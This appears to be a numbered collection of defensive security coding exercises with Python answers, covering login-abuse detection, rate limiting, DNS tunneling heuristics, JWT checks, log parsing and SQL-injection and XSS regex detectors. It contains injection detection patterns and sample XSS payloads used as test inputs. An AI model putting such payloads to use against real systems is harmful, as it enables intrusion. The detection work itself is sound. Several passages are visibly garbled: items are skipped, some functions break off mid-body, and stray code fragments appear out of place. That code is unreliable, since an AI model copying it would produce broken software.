1. Write a log parser that detects failed login bursts

Approach: Group failed-login timestamps per user, sort them, and use a sliding window to find any window of window_seconds containing at least threshold failures. The two-pointer window is O(n) after sorting.

from datetime import datetime
from collections import defaultdict


def detect_failed_login_bursts(lines, threshold=5, window_seconds=60):
    """Return users with >= threshold failed logins within any time window.

    Input lines look like:
      '2026-05-29T08:02:31Z LOGIN_FAILED user=bob ip=203.0.113.10'
    """
    if lines is None:
        raise TypeError("lines cannot be None")
    if threshold <= 0 or window_seconds <= 0:
        raise ValueError("threshold and window_seconds must be positive")

    # Step 1: collect failed-login timestamps per user.
    failures = defaultdict(list)
    for line in lines:
        if "LOGIN_FAILED" not in line:
            continue                          # only failures matter here
        fields = _parse_fields(line)
        user, ts = fields.get("user"), fields.get("_ts")
        if user and ts:
            failures[user].append(ts)

    flagged = []
    # Step 2: sliding window over each user's sorted timestamps.
    for user, times in failures.items():
        times.sort()
        left = 0
        for right in range(len(times)):
            # Shrink window until it spans <= window_seconds.
            while (times[right] - times[left]).total_seconds() > window_seconds:
                left += 1
            if right - left + 1 >= threshold:
                flagged.append(user)
                break                         # one burst is enough to flag
    return flagged


def _parse_fields(line):
    """Extract key=value pairs plus a parsed '_ts' timestamp from a log line."""
    fields = {}
    parts = line.split()
    if parts:
        try:
            fields["_ts"] = datetime.fromisoformat(parts[0].replace("Z", "+00:00"))
        except ValueError:
            fields["_ts"] = None              # tolerate malformed timestamp
    for token in parts[1:]:
        if "=" in token:
            k, v = token.split("=", 1)
            fields[k] = v
    return fields


# Time:  O(n log n) per user (sort); O(n) windowing
# Space: O(n)
# FP/FN: bursts from shared NAT IPs can false-positive; slow attacks evade short windows.
# Scale: stream per-user ring buffers keyed in a store; expire old timestamps.

logs = [
    "2026-05-29T08:00:00Z LOGIN_FAILED user=bob ip=203.0.113.10",
    "2026-05-29T08:00:10Z LOGIN_FAILED user=bob ip=203.0.113.10",
    "2026-05-29T08:00:20Z LOGIN_FAILED user=bob ip=203.0.113.10",
    "2026-05-29T08:00:30Z LOGIN_FAILED user=bob ip=203.0.113.10",
    "2026-05-29T08:00:40Z LOGIN_FAILED user=bob ip=203.0.113.10",
    "2026-05-29T08:00:05Z LOGIN_SUCCESS user=alice ip=10.0.0.1",
]
assert detect_failed_login_bursts(logs, threshold=5, window_seconds=60) == ["bob"]
assert detect_failed_login_bursts([], threshold=5) == []

2. Implement fixed-window rate limiting

Approach: Divide time into fixed buckets (e.g., per minute). Maintain a counter per key per current window; reset when the window rolls over. O(1) per request and O(keys) memory, but it allows bursts at window edges.

import time


class FixedWindowRateLimiter:
    """Allow at most `limit` requests per fixed `window` seconds per key."""

    def __init__(self, limit: int, window: float = 60.0):
        if limit <= 0 or window <= 0:
            raise ValueError("limit and window must be positive")
        self.limit = limit
        self.window = window
        # key -> [window_start_bucket, count_in_bucket]
        self._state: dict[str, list] = {}

    def allow(self, key: str, now: float | None = None) -> bool:
        if key is None:
            raise TypeError("key cannot be None")
        now = time.time() if now is None else now
        bucket = int(now // self.window)      # integer window index

        entry = self._state.get(key)
        if entry is None or entry[0] != bucket:
            self._state[key] = [bucket, 0]    # new/rolled-over window
            entry = self._state[key]
        if entry[1] < self.limit:
            entry[1] += 1                     # consume one request
            return True
        return False                          # over the limit


# Time:  O(1) per request
# Space: O(number of active keys)
# Weakness: up to 2*limit requests across a window boundary (burst at edges).
# Security relevance: cheap brute-force / abuse throttling at API or auth endpoints.

rl = FixedWindowRateLimiter(limit=2, window=60)
assert rl.allow("ip1", now=0) is True
assert rl.allow("ip1", now=1) is True
assert rl.allow("ip1", now=2) is False        # 3rd request in same window blocked
assert rl.allow("ip1", now=61) is True         # next window resets the counter

3. Implement sliding-window rate limiting

Approach: Keep a timestamp log per key in a deque; on each request, evict timestamps older than the window, then allow if the remaining count is under the limit. This removes the edge-burst flaw of fixed windows at the cost of storing recent timestamps.

import time
from collections import deque


class SlidingWindowRateLimiter:
    """Allow at most `limit` requests in any rolling `window` seconds per key."""

    def __init__(self, limit: int, window: float = 60.0):
        if limit <= 0 or window <= 0:
            raise ValueError("limit and window must be positive")
        self.limit = limit
        self.window = window
        self._events: dict[str, deque] = {}   # key -> recent timestamps

    def allow(self, key: str, now: float | None = None) -> bool:
        if key is None:
            raise TypeError("key cannot be None")
        now = time.time() if now is None else now

        dq = self._events.setdefault(key, deque())
        cutoff = now - self.window
        # Evict timestamps that have aged out of the rolling window.
        while dq and dq[0] <= cutoff:
            dq.popleft()
        if len(dq) < self.limit:
            dq.append(now)                    # record this request
            return True
        return False


# Time:  amortized O(1) per request (each timestamp added/removed once)
# Space: O(limit) timestamps per active key
# Security relevance: precise abuse limiting without the fixed-window edge burst.

rl = SlidingWindowRateLimiter(limit=2, window=60)
assert rl.allow("u", now=0) is True
assert rl.allow("u", now=30) is True
assert rl.allow("u", now=59) is False          # 3 within 60s -> blocked
assert rl.allow("u", now=61) is True           # first event (t=0) has expired

4. Implement token bucket rate limiting

Approach: A bucket refills at a steady rate up to a capacity; each request consumes one token. This permits controlled bursts (up to capacity) while bounding the sustained rate. State is just the token count and last refill time.

import time


class TokenBucketRateLimiter:
    """Token bucket: steady refill `rate`/sec, burst capacity `capacity`."""

    def __init__(self, rate: float, capacity: float):
        if rate <= 0 or capacity <= 0:
            raise ValueError("rate and capacity must be positive")
        self.rate = rate                      # tokens added per second
        self.capacity = capacity              # max tokens (burst size)
        self._tokens = capacity               # start full
        self._last = None                     # last refill timestamp

    def allow(self, now: float | None = None, cost: float = 1.0) -> bool:
        now = time.time() if now is None else now
        if self._last is None:
            self._last = now
        # Refill based on elapsed time, capped at capacity.
        elapsed = max(0.0, now - self._last)
        self._tokens = min(self.capacity, self._tokens + elapsed * self.rate)
        self._last = now

        if self._tokens >= cost:
            self._tokens -= cost              # consume token(s)
            return True
        return False


# Time:  O(1) per request
# Space: O(1) per bucket (per key in practice)
# Security relevance: smooth throttling that tolerates legitimate bursts (APIs, login).

tb = TokenBucketRateLimiter(rate=1, capacity=2)   # 1 token/sec, burst of 2
assert tb.allow(now=0) is True                 # burst 1
assert tb.allow(now=0) is True                 # burst 2
assert tb.allow(now=0) is False                # bucket empty
assert tb.allow(now=1) is True                 # 1s later -> 1 token refilled

5. Compare fixed-window, sliding-window, and token-bucket rate limiting

Conceptual question; structure the comparison around accuracy, memory, and burst behavior.

Algorithm Memory per key Burst behavior Accuracy Best for
Fixed window O(1) counter Allows up to 2x at window edges Coarse Cheap, approximate throttling
Sliding window log O(limit) timestamps No edge burst; exact count in window Exact Precise abuse limits, auth endpoints
Sliding window counter O(1)-O(2) buckets Smooths edges by weighting two windows Near-exact, cheap High-scale approximate limiting
Token bucket O(1) tokens + time Allows bounded bursts (capacity) Rate-accurate APIs that should tolerate short bursts
  • Fixed window: simplest and cheapest; the classic flaw is a double burst spanning a boundary.
  • Sliding window (log): exact but stores timestamps; memory grows with the limit.
  • Sliding window (counter): approximates the log with two adjacent buckets and O(1) memory — a common production compromise.
  • Token bucket: decouples sustained rate (refill) from burst size (capacity); great for user-facing APIs. Its sibling, the leaky bucket, instead enforces a smooth output rate.
  • Security angle: choose based on the threat — auth brute force wants tight, exact limits (sliding); general API abuse tolerates token-bucket bursts; ultra-high scale favors O(1) counters.
# Decision helper capturing the tradeoff rules above.
def choose_rate_limiter(need_exact: bool, allow_bursts: bool, memory_tight: bool) -> str:
    if allow_bursts:
        return "token_bucket"
    if need_exact and not memory_tight:
        return "sliding_window_log"
    if memory_tight:
        return "sliding_window_counter" if need_exact else "fixed_window"
    return "fixed_window"

assert choose_rate_limiter(need_exact=True, allow_bursts=False, memory_tight=False) == "sliding_window_log"
assert choose_rate_limiter(need_exact=False, allow_bursts=True, memory_tight=True) == "token_bucket"

6. Given login logs, detect password spraying

Approach: Password spraying = one source tries a few passwords across many distinct accounts (low-and-slow to dodge per-account lockout). Group failed logins by source IP and flag sources whose count of distinct targeted users exceeds a threshold. A defaultdict(set) tracks unique users per IP.

from collections import defaultdict


def detect_password_spraying(events, distinct_user_threshold=10):
    """Flag source IPs that fail logins against many distinct users.

    events: iterable of dicts with keys: result, ip, user
    """
    if events is None:
        raise TypeError("events cannot be None")
    if distinct_user_threshold <= 0:
        raise ValueError("threshold must be positive")

    users_by_ip = defaultdict(set)            # ip -> set of failed-target users
    for e in events:
        if e.get("result") != "FAILED":
            continue
        ip, user = e.get("ip"), e.get("user")
        if ip and user:
            users_by_ip[ip].add(user)         # set dedupes repeated attempts

    # Spraying = breadth across accounts, not depth on one account.
    return [ip for ip, users in users_by_ip.items()
            if len(users) >= distinct_user_threshold]


# Time:  O(n)
# Space: O(distinct ip-user pairs)
# FP/FN: shared egress IPs (VPN/NAT) inflate breadth; distributed sprays split across IPs evade.
# Scale: per-IP HyperLogLog for distinct-user cardinality keeps memory bounded.

events = [{"result": "FAILED", "ip": "5.5.5.5", "user": f"user{i}"} for i in range(12)]
events.append({"result": "SUCCESS", "ip": "5.5.5.5", "user": "userX"})
assert detect_password_spraying(events, distinct_user_threshold=10) == ["5.5.5.5"]
assert detect_password_spraying([], distinct_user_threshold=10) == []

7. Given login logs, detect credential stuffing

Approach: Credential stuffing replays many valid-looking breached username/password pairs, so the signature is a high volume of attempts (often many failures then a sudden success) from one source, frequently with a high distinct-credential count. Here we flag IPs with many total failures AND at least one success (compromise signal).

from collections import defaultdict


def detect_credential_stuffing(events, attempt_threshold=20):
    """Flag IPs with many failed attempts that also achieved a success.

    events: dicts with keys: result, ip, user
    """
    if events is None:
        raise TypeError("events cannot be None")
    if attempt_threshold <= 0:
        raise ValueError("threshold must be positive")

    fails = defaultdict(int)                   # ip -> failed attempt count
    successes = defaultdict(int)               # ip -> success count
    for e in events:
        ip = e.get("ip")
        if not ip:
            continue
        if e.get("result") == "FAILED":
            fails[ip] += 1
        elif e.get("result") == "SUCCESS":
            successes[ip] += 1

    # High failure volume + a breakthrough success = likely stuffing hit.
    return [ip for ip, n in fails.items()
            if n >= attempt_threshold and successes.get(ip, 0) > 0]


# Time:  O(n)
# Space: O(distinct IPs)
# FP/FN: corporate proxies aggregate users (FP); slow distributed stuffing evades volume (FN).
# Scale: combine with device fingerprint + impossible travel; feed to risk-based auth.

events = [{"result": "FAILED", "ip": "9.9.9.9", "user": f"u{i}"} for i in range(25)]
events.append({"result": "SUCCESS", "ip": "9.9.9.9", "user": "victim"})
assert detect_credential_stuffing(events, attempt_threshold=20) == ["9.9.9.9"]
assert detect_credential_stuffing(events, attempt_threshold=100) == []

8. Given login logs, detect impossible travel using timestamps and locations

Approach: For each user, sort successful logins by time and compare consecutive geolocations. If the required speed (great-circle distance / time delta) exceeds a plausible maximum (e.g., 900 km/h for air travel), flag it. Use the Haversine formula for distance on a sphere.

from math import radians, sin, cos, asin, sqrt
from datetime import datetime
from collections import defaultdict


def _haversine_km(lat1, lon1, lat2, lon2):
    """Great-circle distance between two lat/lon points in kilometers."""
    r = 6371.0                                 # Earth radius (km)
    dlat = radians(lat2 - lat1)
    dlon = radians(lon2 - lon1)
    a = sin(dlat / 2) ** 2 + cos(radians(lat1)) * cos(radians(lat2)) * sin(dlon / 2) ** 2
    return 2 * r * asin(sqrt(a))


def detect_impossible_travel(events, max_speed_kmh=900.0):
    """Flag (user, time) logins requiring travel faster than max_speed_kmh.

    events: dicts with keys: user, ts (ISO-8601), lat, lon
    """
    if events is None:
        raise TypeError("events cannot be None")

    by_user = defaultdict(list)
    for e in events:
        ts = datetime.fromisoformat(e["ts"].replace("Z", "+00:00"))
        by_user[e["user"]].append((ts, e["lat"], e["lon"]))

    flagged = []
    for user, logins in by_user.items():
        logins.sort()                          # chronological order
        for (t1, la1, lo1), (t2, la2, lo2) in zip(logins, logins[1:]):
            hours = (t2 - t1).total_seconds() / 3600.0
            if hours <= 0:
                continue                       # same/duplicate timestamp -> skip
            dist = _haversine_km(la1, lo1, la2, lo2)
            if dist / hours > max_speed_kmh:   # required speed too high
                flagged.append((user, t2.isoformat()))
    return flagged


# Time:  O(n log n) per user (sort)
# Space: O(n)
# FP/FN: VPNs/geo-IP error cause FPs; mobile-IP geolocation drift matters; tune the threshold.
# Scale: keep only each user's last login location in a store; compare on each new login.

events = [
    {"user": "alice", "ts": "2026-05-29T08:00:00Z", "lat": 37.77, "lon": -122.42},  # SF
    {"user": "alice", "ts": "2026-05-29T09:00:00Z", "lat": 40.71, "lon": -74.00},   # NYC 1h later
]
flags = detect_impossible_travel(events)
assert len(flags) == 1 and flags[0][0] == "alice"
assert detect_impossible_travel([]) == []

9. Given API logs, detect excessive 403 responses by user

Approach: A spike of 403 (Forbidden) responses for one principal suggests authorization probing or a broken/over-privileged client. Count 403s per user and flag those over a threshold. A Counter does this in one pass.

from collections import Counter


def detect_excessive_403(logs, threshold=50):
    """Flag users whose count of HTTP 403 responses exceeds threshold.

    logs: dicts with keys: user, status
    """
    if logs is None:
        raise TypeError("logs cannot be None")
    if threshold <= 0:
        raise ValueError("threshold must be positive")

    forbidden = Counter()
    for entry in logs:
        # Compare as int but tolerate string status codes.
        if int(entry.get("status", 0)) == 403:
            user = entry.get("user")
            if user:
                forbidden[user] += 1

    return [user for user, count in forbidden.items() if count >= threshold]


# Time:  O(n)
# Space: O(distinct users)
# FP/FN: a misconfigured legit client floods 403s (FP); slow enumeration stays under threshold (FN).
# Scale: per-user sliding-window counters; alert on rate, not just total.

logs = [{"user": "mallory", "status": 403} for _ in range(60)]
logs += [{"user": "alice", "status": 200} for _ in range(10)]
assert detect_excessive_403(logs, threshold=50) == ["mallory"]
assert detect_excessive_403([], threshold=50) == []

10. Given API logs, detect possible BOLA attempts

Approach: BOLA / IDOR = one user accessing many distinct object IDs they likely should not own, often signaled by many 403/404s across different IDs. Track the set of distinct object IDs each user is denied, and flag users probing more than a threshold of objects.

from collections import defaultdict


def detect_bola_attempts(logs, distinct_object_threshold=20):
    """Flag users denied access to many distinct object IDs (BOLA/IDOR probing).

    logs: dicts with keys: user, object_id, status
    """
    if logs is None:
        raise TypeError("logs cannot be None")
    if distinct_object_threshold <= 0:
        raise ValueError("threshold must be positive")

    denied_objects = defaultdict(set)          # user -> set of denied object IDs
    for entry in logs:
        status = int(entry.get("status", 0))
        if status in (403, 404):               # denied or not-found = probing signal
            user, obj = entry.get("user"), entry.get("object_id")
            if user and obj is not None:
                denied_objects[user].add(obj)  # set counts distinct objects only

    # Breadth of distinct objects probed indicates enumeration, not a single typo.
    return [user for user, objs in denied_objects.items()
            if len(objs) >= distinct_object_threshold]


# Time:  O(n)
# Space: O(distinct user-object pairs)
# FP/FN: buggy clients re-requesting many IDs (FP); attackers spreading across accounts (FN).
# Scale: per-user HyperLogLog on object IDs; correlate with sequential-ID patterns.

logs = [{"user": "eve", "object_id": i, "status": 403} for i in range(25)]
logs += [{"user": "bob", "object_id": 1, "status": 200}]
assert detect_bola_attempts(logs, distinct_object_threshold=20) == ["eve"]
assert detect_bola_attempts([], distinct_object_threshold=20) == []

11. Given access logs, find top source IPs by request volume

Approach: Count requests per IP with a Counter, then take the top N with a bounded heap (most_common). Counting is O(n); selecting top N is O(n log N).

from collections import Counter


def top_source_ips(logs, n=10):
    """Return the n busiest source IPs as (ip, count), descending."""
    if logs is None:
        raise TypeError("logs cannot be None")
    if n <= 0:
        raise ValueError("n must be positive")

    counts = Counter()
    for entry in logs:
        ip = entry.get("ip")
        if ip:                                 # skip records with no source IP
            counts[ip] += 1
    return counts.most_common(n)               # heap-based top-n selection


# Time:  O(m log n) for m records, top n
# Space: O(distinct IPs)
# FP/FN: top volume != malicious (CDNs, health checks); use as triage, not verdict.
# Scale: Count-Min Sketch / HeavyKeeper for heavy hitters over huge streams.

logs = [{"ip": "1.1.1.1"}] * 5 + [{"ip": "2.2.2.2"}] * 3 + [{"ip": "3.3.3.3"}]
assert top_source_ips(logs, n=2) == [("1.1.1.1", 5), ("2.2.2.2", 3)]
assert top_source_ips([], n=2) == []

13. Given DNS logs, detect unusually long domain names

Approach: Long fully-qualified domain names (or long individual labels) are a cheap heuristic for DNS tunneling / DGA, which encode data into names. Flag queries whose total length or longest label exceeds a threshold. O(n) scan.

def detect_long_domains(queries, max_total_len=100, max_label_len=40):
    """Flag DNS queries with overly long names or labels (tunneling/DGA heuristic)."""
    if queries is None:
        raise TypeError("queries cannot be None")
    if max_total_len <= 0 or max_label_len <= 0:
        raise ValueError("length thresholds must be positive")

    flagged = []
    for q in queries:
        if not q:
            continue                           # skip empty/None entries
        labels = q.split(".")
        longest_label = max((len(lbl) for lbl in labels), default=0)
        if len(q) > max_total_len or longest_label > max_label_len:
            flagged.append(q)
    return flagged


# Time:  O(total characters)
# Space: O(number flagged)
# FP/FN: some legit CDNs/hashes are long (FP); short-chunk tunneling stays under limits (FN).
# Scale: combine length with entropy + query rate per domain for higher fidelity.

queries = ["example.com", "a" * 50 + ".evil.com", "short.test"]
flagged = detect_long_domains(queries, max_total_len=100, max_label_len=40)
assert flagged == ["a" * 50 + ".evil.com"]
assert detect_long_domains([]) == []

14. Given DNS logs, detect high-entropy subdomains

Approach: Encoded/encrypted tunneling payloads look random, so the subdomain's Shannon entropy is high. Compute entropy of the leftmost label; flag values above a bits-per-char threshold. Entropy = -sum(p * log2 p) over character frequencies.

import math
from collections import Counter


def shannon_entropy(s: str) -> float:
    """Shannon entropy (bits per character) of a string."""
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    # Sum of -p*log2(p) over each distinct character.
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def detect_high_entropy_subdomains(queries, entropy_threshold=3.5, min_len=10):
    """Flag DNS queries whose leftmost label has high entropy (random-looking)."""
    if queries is None:
        raise TypeError("queries cannot be None")

    flagged = []
    for q in queries:
        if not q:
            continue
        label = q.split(".")[0]                # leftmost (most dynamic) label
        # Ignore short labels: entropy is unreliable on tiny strings.
        if len(label) >= min_len and shannon_entropy(label) >= entropy_threshold:
            flagged.append(q)
    return flagged


# Time:  O(total characters)
# Space: O(distinct chars per label)
# FP/FN: hashed CDN/asset names are high-entropy (FP); dictionary-word tunneling evades (FN).
# Scale: maintain per-parent-domain entropy baselines; alert on deviation.

queries = ["aGVsbG8x9zQk2mWp.evil.com", "www.google.com", "mail.example.com"]
flagged = detect_high_entropy_subdomains(queries, entropy_threshold=3.5, min_len=10)
assert "aGVsbG8x9zQk2mWp.evil.com" in flagged
assert "www.google.com" not in flagged

15. Given DNS logs, detect possible DNS tunneling

Approach: No single signal is reliable, so combine three: high query volume to one parent domain, long names, and high-entropy labels. Aggregate per registered/parent domain and score. This composite reduces false positives versus any single heuristic.

from collections import defaultdict


def detect_dns_tunneling(queries, volume_threshold=50,
                         long_len=50, entropy_threshold=3.5):

    queries: list of FQDN strings.
    """

    for q in queries:
        if not q:
            continue

        parent = ".".join(labels[-2:]) if len(labels) >= 2 else q  # registered domain

            s["high_entropy"] += 1

        # Require high volume AND at least one structural anomaly signal.
        if s["count"] >= volume_threshold and (s["long"] > 0 or s["high_entropy"] > 0):
            suspects.append(parent)
    return suspects

20. Implement an allowlist/denylist matcher for IP addresses

Approach: Precompute lists of ip_network objects. Evaluate denylist first (deny wins) then allowlist, returning a decision. Storing parsed networks avoids re-parsing per check; for very large lists a radix/patricia trie gives near-constant longest-prefix matching.

import ipaddress


class IPAccessMatcher:
    """Decide allow/deny for IPs using CIDR allowlists and denylists (deny wins)."""

    def __init__(self, allowlist=None, denylist=None, default_allow=False):
        self._allow = self._parse(allowlist or [])
        self._deny = self._parse(denylist or [])
        self._default_allow = default_allow

    @staticmethod
    def _parse(cidrs):
        nets = []
        for c in cidrs:
            try:
                nets.append(ipaddress.ip_network(c, strict=False))
            except ValueError as exc:
                raise ValueError(f"invalid cidr {c!r}: {exc}") from exc
        return nets

    @staticmethod
    def _matches(addr, nets):
        # True if addr is inside any network of the same address family.
        return any(addr.version == net.version and addr in net for net in nets)

    def is_allowed(self, ip: str) -> bool:
        if ip is None:
            raise TypeError("ip cannot be None")
        try:
            addr = ipaddress.ip_address(ip)
        except ValueError as exc:
            raise ValueError(f"invalid ip {ip!r}: {exc}") from exc

        if self._matches(addr, self._deny):
            return False                       # explicit deny always wins
        if self._matches(addr, self._allow):
            return True                        # explicit allow
        return self._default_allow             # fall back to default policy


# Time:  O(rules) per check (use a patricia trie for O(bits) at scale)
# Space: O(rules)
# Security relevance: deny-by-default segmentation, SSRF egress control, WAF IP policy.

assert m.is_allowed("10.1.2.3") is True        # in allowlist
assert m.is_allowed("10.6.6.6") is False        # deny wins over allow
assert m.is_allowed("8.8.8.8") is False         # default deny

21. Normalize a URL for security validation

Approach: Parse with urllib.parse, then canonicalize: lowercase scheme/host, strip default ports, resolve ./.. in the path, and reject non-HTTP(S) schemes. Normalization must happen before any allow/deny check, or attackers bypass filters with equivalent encodings.

from urllib.parse import urlsplit, urlunsplit
import posixpath


def normalize_url(url: str) -> str:
    """Canonicalize an HTTP(S) URL for consistent security comparisons."""
    if url is None:
        raise TypeError("url cannot be None")
    if not isinstance(url, str) or not url.strip():
        raise ValueError("url must be a non-empty string")

    parts = urlsplit(url.strip())
    scheme = parts.scheme.lower()
    if scheme not in ("http", "https"):
        raise ValueError(f"unsupported scheme: {scheme!r}")

    host = (parts.hostname or "").lower()      # lowercase, drops userinfo
    if not host:
        raise ValueError("missing host")

    # Drop default ports so http://h:80 == http://h.
    port = parts.port
    if port and not ((scheme == "http" and port == 80) or (scheme == "https" and port == 443)):
        host = f"{host}:{port}"

    # Collapse '.', '..', and duplicate slashes in the path.
    path = posixpath.normpath(parts.path or "/")
    if path == ".":
        path = "/"

    return urlunsplit((scheme, host, path, parts.query, ""))   # drop fragment


# Time:  O(n) in URL length
# Space: O(n)
# Security relevance: defeats encoding/case/port tricks before allowlist or SSRF checks.

assert normalize_url("https://host:443/x") == "https://host/x"

    assert False
except ValueError:
    pass

        return 0.0

    return -sum((c / n) * math.log2(c / n) for c in counts.values())

32. Check token expiry with clock skew

Approach: Compare exp/nbf against the current time but allow a small leeway (clock skew) so legitimate tokens are not rejected over minor clock drift between issuer and verifier. Reject when clearly expired or not-yet-valid beyond the leeway.

import time


def is_token_time_valid(claims: dict, now: float | None = None, leeway: float = 60.0) -> bool:
    """True if the token is within its [nbf, exp] window allowing clock skew."""
    if claims is None:
        raise TypeError("claims cannot be None")
    if leeway < 0:
        raise ValueError("leeway must be non-negative")
    now = time.time() if now is None else now

    exp = claims.get("exp")
    nbf = claims.get("nbf")
    iat = claims.get("iat")

    # Expired if now is past exp by more than the allowed skew.
    if exp is not None and now > exp + leeway:
        return False
    # Not yet valid if now is before nbf by more than the skew.
    if nbf is not None and now < nbf - leeway:
        return False
    # Reject tokens issued in the "future" beyond skew (clock tampering signal).
    if iat is not None and now < iat - leeway:
        return False
    return True


# Time:  O(1)
# Space: O(1)
# Security relevance: too-tight checks break under skew (FN); leeway must be small to
#                     avoid extending the window for stolen/expired tokens.

assert is_token_time_valid({"nbf": now + 120}, now=now, leeway=60) is False  # not yet valid

34. Parse a JWT safely without trusting its contents

Approach: Combine the prior pieces into one safe parser that enforces structure, rejects the alg=none downgrade, and returns header+claims for downstream signature verification — but never asserts validity by itself. The function makes the "must still verify signature" contract explicit.

import json
import base64


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def parse_jwt_safely(token: str) -> dict:
    """Structurally parse a JWT and reject obvious tampering downgrades.

    Returns {'header', 'claims', 'signature_segment', 'verified': False}.
    The caller MUST verify the signature before trusting any claim.
    """
    if token is None:
        raise TypeError("token cannot be None")
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("malformed JWT: expected header.payload.signature")

    try:
        header = json.loads(_b64url_decode(parts[0]))
        claims = json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError) as exc:
        raise ValueError(f"invalid JWT encoding: {exc}") from exc

    alg = str(header.get("alg", "")).lower()
    if alg in ("none", ""):                    # reject the alg=none attack
        raise ValueError("insecure 'alg=none' token rejected")
    if parts[2] == "":                          # empty signature is never acceptable
        raise ValueError("missing signature segment")

    return {"header": header, "claims": claims,
            "signature_segment": parts[2], "verified": False}


# Time:  O(n)
# Space: O(n)
# Security relevance: defends against alg=none and malformed-token attacks; keeps the
#                     "decode != verify" boundary explicit so callers can't skip verification.

35. Given events, build a rolling anomaly detector for request counts

Approach: Maintain a rolling baseline (mean and standard deviation) over recent windows and flag a new window whose count exceeds mean + k*std (a z-score threshold). A deque of recent counts bounds memory; this is the classic statistical detector.

from collections import deque
import statistics


class RollingAnomalyDetector:
    """Flag request-count windows that deviate from a rolling baseline."""

    def __init__(self, window_size: int = 30, z_threshold: float = 3.0):
        if window_size < 2:
            raise ValueError("window_size must be >= 2")
        if z_threshold <= 0:
            raise ValueError("z_threshold must be positive")
        self.window_size = window_size
        self.z_threshold = z_threshold
        self._history = deque(maxlen=window_size)   # bounded baseline buffer

    def observe(self, count: int) -> bool:
        """Add a window count; return True if it is anomalous vs. the baseline."""
        if count < 0:
            raise ValueError("count cannot be negative")

        anomaly = False
        # Need enough history to form a stable baseline.
        if len(self._history) >= 2:
            mean = statistics.fmean(self._history)
            std = statistics.pstdev(self._history)
            if std > 0 and (count - mean) / std >= self.z_threshold:
                anomaly = True
            elif std == 0 and count > mean:    # flat baseline then a jump
                anomaly = True
        self._history.append(count)            # update rolling baseline
        return anomaly


# Time:  O(window_size) per observation (mean/std); O(1) amortized with running sums
# Space: O(window_size)
# FP/FN: seasonality (daily peaks) causes FPs - use per-hour baselines; slow ramps evade z-score.
# Security relevance: detecting volumetric anomalies (DDoS, scraping, exfil bursts).

det = RollingAnomalyDetector(window_size=10, z_threshold=3.0)
for _ in range(10):
    det.observe(100)                            # stable baseline ~100
assert det.observe(105) is False               # normal fluctuation
assert det.observe(100000) is True             # massive spike flagged

from collections import defaultdict, deque
import statistics


def detect_download_spikes(events, history=7, spike_multiplier=5.0):
    """Flag (user, value) where today's download volume >> the user's median.

    events: ordered dicts with keys: user, bytes  (one per period per user)
    """
    if events is None:
        raise TypeError("events cannot be None")
    if spike_multiplier <= 1:
        raise ValueError("spike_multiplier must be > 1")

    per_user = defaultdict(lambda: deque(maxlen=history))
    flagged = []
    for e in events:
        user, value = e.get("user"), e.get("bytes")

            median = statistics.median(hist)
            # Compare against the user's own normal behavior (median is robust).
            if median > 0 and value >= median * spike_multiplier:
                flagged.append((user, value))
        hist.append(value)                      # update the user's baseline
    return flagged

43. Build a parser for common web access log format

Approach: The Common Log Format (CLF) has a fixed grammar; a single anchored regex with named groups extracts fields robustly, including the quoted request line and bracketed timestamp. Named groups make downstream access clear and resistant to field-position bugs.

import re


# Common Log Format:
#   host ident authuser [date] "request" status bytes
_CLF = re.compile(
    r'(?P<host>\S+)\s+'
    r'(?P<ident>\S+)\s+'
    r'(?P<authuser>\S+)\s+'
    r'\[(?P<date>[^\]]+)\]\s+'
    r'"(?P<request>[^"]*)"\s+'
    r'(?P<status>\d{3})\s+'
    r'(?P<bytes>\d+|-)'
)


def parse_access_log(line: str) -> dict | None:
    """Parse one CLF access-log line into a dict, or None if it does not match."""
    if line is None:
        raise TypeError("line cannot be None")

    m = _CLF.match(line.strip())
    if not m:
        return None                            # malformed line -> caller decides

    data = m.groupdict()
    data["status"] = int(data["status"])
    # '-' means zero bytes in CLF.
    data["bytes"] = 0 if data["bytes"] == "-" else int(data["bytes"])

    # Split the request line into method, path, protocol when well-formed.
    request_parts = data["request"].split()
    if len(request_parts) == 3:
        data["method"], data["path"], data["protocol"] = request_parts
    return data


# Time:  O(n) per line
# Space: O(1) per line
# FP/FN: returns None on malformed lines so detection logic can skip/log them safely.
# Security relevance: foundation for all web-log detections (scanning, injection, abuse).

parsed = parse_access_log(line)
assert parsed["host"] == "203.0.113.5"
assert parsed["status"] == 403 and parsed["bytes"] == 512
assert parsed["method"] == "GET" and parsed["path"] == "/admin"
assert parse_access_log("garbage line") is None

import re
from urllib.parse import unquote


_SQLI_PATTERNS = [
    re.compile(r"(?i)\bunion\b\s+\bselect\b"),          # UNION SELECT
    re.compile(r"(?i)\bor\b\s+\d+\s*=\s*\d+"),          # OR 1=1 tautology

    re.compile(r"(--|#|/\*)"),                           # SQL comment markers
    re.compile(r"(?i);\s*(drop|delete|update|insert)\b"),  # stacked queries
    re.compile(r"(?i)\b(sleep|benchmark|waitfor)\s*\("),    # time-based blind
]

        raise TypeError("value cannot be None")

    decoded = unquote(value)                    # defeat %27 etc. encoding
    return any(p.search(decoded) for p in _SQLI_PATTERNS)

# Space: O(1)

Approach: Decode, then match common XSS vectors: <script> tags, javascript: URIs, inline event handlers (onerror=), and <img>/<svg> with handlers. Heuristic detection complements—but does not replace—output encoding and a strong CSP.

import re
from urllib.parse import unquote


_XSS_PATTERNS = [
    re.compile(r"(?i)<\s*script\b"),                    # <script>
    re.compile(r"(?i)javascript\s*:"),                  # javascript: URI
    re.compile(r"(?i)\bon\w+\s*="),                     # onerror=, onload=, ...
    re.compile(r"(?i)<\s*(img|svg|iframe|body)\b[^>]*\bon\w+"),  # tag + handler
    re.compile(r"(?i)<\s*/?\s*(object|embed)\b"),       # object/embed
]


def detect_xss(value: str) -> bool:
    """Heuristically detect XSS-like payloads in a request parameter."""
    if value is None:
        raise TypeError("value cannot be None")

    decoded = unquote(value)
    return any(p.search(decoded) for p in _XSS_PATTERNS)


# Time:  O(P * n)
# Space: O(1)
# FP/FN: legit HTML/markdown input causes FPs; encoding/mutation XSS evades regex (FN).
# Security relevance: defense-in-depth - real fixes are context-aware output encoding + CSP.

assert detect_xss("<script>alert(1)</script>") is True
assert detect_xss("%3Cscript%3Ealert(1)%3C/script%3E") is True   # encoded
assert detect_xss('<img src=x onerror=alert(1)>') is True
assert detect_xss("hello world") is False

